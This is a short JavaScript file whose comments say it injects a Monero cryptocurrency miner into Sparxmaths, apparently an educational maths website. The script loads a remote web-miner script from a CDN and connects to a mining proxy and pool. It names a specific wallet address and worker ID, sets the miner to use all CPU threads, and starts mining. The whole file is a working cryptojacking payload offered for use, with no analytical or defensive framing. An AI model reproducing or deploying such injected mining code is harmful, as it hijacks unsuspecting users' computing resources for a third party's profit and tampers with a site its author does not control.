// This script is used to inject XMR Mining js code into Sparxmaths

// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://f.xmrminingproxy.com:8181";
var pool = "moneroocean.stream";
var walletAddress = "4APDbaHLvcf4jFqbM2xP4KMR6PEURKz6eUTDmQkLZ1TkETEwycVZNSRfxqqxf685ub6JKTrND8u8e9rCMK2sB9KMMizJKXP";
var workerId = "Sparx User"
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
